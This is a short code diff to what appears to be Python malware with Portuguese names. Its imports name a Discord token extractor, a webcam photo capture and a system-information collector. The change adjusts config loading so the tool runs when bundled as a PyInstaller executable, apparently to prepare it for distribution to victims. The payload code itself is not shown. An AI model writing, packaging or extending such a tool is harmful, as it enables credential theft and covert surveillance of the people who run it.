@@ -2,6 +2,7 @@ import subprocess
 import requests
 import os
 import json
+import sys
 from plugins.systeminfo import obter_informacoes_sistema
 from plugins.discordtoken import TokenExtractor
 from plugins.webcam import capture_photo
@@ -25,7 +26,8 @@ if not os.path.exists(pasta_nyx):
     os.makedirs(pasta_nyx)
 
 def load_config():
-    with open('config.json', 'r') as f:
+    config_path = os.path.join(sys._MEIPASS, 'config.json') if hasattr(sys, '_MEIPASS') else 'config.json'
+    with open(config_path, 'r') as f:
         return json.load(f)
 
 executou_informacoes_sistema = False
